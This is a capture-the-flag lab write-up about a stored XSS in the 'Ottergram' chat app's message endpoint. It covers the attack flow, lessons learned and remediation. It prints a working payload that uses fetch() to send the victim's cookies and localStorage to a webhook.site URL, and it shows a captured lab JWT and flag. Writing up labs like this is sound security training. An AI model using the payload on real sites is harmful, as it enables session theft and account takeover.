---
vulnerability: XSS
platform: BugForge
difficulty: Medium
date: 2025-12-02
---
# Lab: Ottergram Chat Privilege Escalation

## Vulnerability Overview
A critical stored XSS vulnerability existed in the private messaging feature of the `Ottergram` chat application. User input in the message `content` field was not adequately sanitized on the server-side before being stored. When a malicious message was viewed, the payload executed in the victim's browser context. This allowed an attacker to steal the victim's `JSON Web Token (JWT)` and their full user profile, leading to a complete compromise of the admin account and capture of the system flag.

## Vulnerable Endpoint
**POST** `/api/messages` (Message creation endpoint)
**Note on the Rabbit Hole**: Initial reconnaissance showed active WebSocket (`socket.io`) communication for real-time features like `"new-message"` and `"preview-message"`. While this initially seemed like a potential attack vector for triggering the `XSS` or `intercepting data`, investigation proved that the core vulnerability was in the primary `HTTP API`. The WebSocket channel was a **distraction**; the simple HTTP message creation endpoint was the key.

## Attack Flow
1. **Discovery**: Identified that message content sent via the web interface was HTML-encoded on the client-side before submission.
2. **Bypass**: Used Burp Suite to intercept and modify the `POST /api/messages` request, injecting raw HTML/JavaScript payloads directly into the `content` parameter, bypassing the front-end encoding.
3. **Injection**: Sent a stored XSS payload designed to exfiltrate the victim's authentication data.
4. **Trigger**: The payload was automatically triggered when the admin user (or a bot simulating the admin) viewed their message inbox, executing the JavaScript in their privileged context.
5. **Exfiltration**: The malicious script collected `localStorage` and `document.cookie` and sent it to a controlled webhook server.
6. **Compromise**: The exfiltrated data contained the admin's JWT `token` and serialized `user` object, granting full access to the admin account and revealing the `flag`.

## Exploitation Payload
`<img src=x onerror="fetch('https://webhook.site/YOUR-ID?test=execute&cookie='+encodeURIComponent(document.cookie)+'&localStorage='+encodeURIComponent(JSON.stringify(localStorage)));"`

## Payload Breakdown
- **`<img src=x onerror=...>`**: An image tag with a deliberately invalid source (`x`). This forces an error, immediately triggering the `onerror` event handler, which contains our malicious JavaScript. This is a reliable vector for execution when elements are rendered via `innerHTML`.
- **`fetch(...)`**: The JavaScript `fetch` API is used to send the stolen data to an attacker-controlled server ([webhook.site](https://webhook.site/)).
- **`encodeURIComponent(JSON.stringify(localStorage))`**: This comprehensively steals all key-value pairs stored in the browser's `localStorage`, which is where the application's JWT and user session data were kept. `encodeURIComponent` ensures safe transmission of the data in a URL.
- 
## Exfiltrated Data
The attack successfully captured the following sensitive information from the admin's session:
	{
	  "flag": "bug{76fb5ee8e71e8213229005ee8cc2ec6e}",
	  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJhZG1pbiIsImlhdCI6MTc2NDcwOTI1NH0.8rRVZsdoEm0kchycOk5FrOaX3XA6FQEGc5azCppGSlE",
	  "user": "{\"id\":2,\"username\":\"admin\",\"role\":\"admin\"}"
	}

## Lesson Learned
1. **Client-Side Controls Are Not Security**: Relying solely on client-side input encoding or sanitization is insufficient. Attackers can bypass the front end by directly interfacing with the server API (e.g., using Burp Suite). **All validation and sanitization must be performed server-side.**
2. **Sanitize on Output, Not Just Input**: While sanitizing before storage is good, also encoding user-controlled data when it is **output** into an HTML context (e.g., using safe functions like `textContent` instead of `innerHTML`) provides a critical secondary defense layer.
3. **JWTs in `localStorage` Are Risky**: Storing authentication tokens in `localStorage` makes them accessible to any XSS vulnerability, leading to instant account takeover. Consider using `HttpOnly` cookies for tokens to mitigate this specific risk, though this does not solve the underlying XSS problem.
4. **Follow the Data Path**: Initial analysis of complex features like WebSockets can lead to rabbit holes. The most effective methodology is to systematically test all user inputs in the simplest possible context (HTTP requests/responses) first.

## Remediation
1. **Implement Strict Server-Side Input Validation**: Reject or rigorously sanitize any message content containing HTML tags or JavaScript event handlers before it is stored in the database.
2. **Use Context-Aware Output Encoding**: When rendering user data in the chat interface, use safe methods that treat data as text, not HTML. For example, in JavaScript, use `element.textContent = userData` instead of `element.innerHTML = userData`.
3. **Set a Strong Content Security Policy (CSP)**: Implement a CSP header to block inline scripts (`'unsafe-inline'`) and restrict `fetch` calls to known domains, which would have prevented this specific exfiltration payload from succeeding.
4. **Review Authentication Token Storage**: Evaluate moving the JWT from `localStorage` to an `HttpOnly` cookie to prevent direct access via JavaScript, while ensuring other CSRF protections are in place.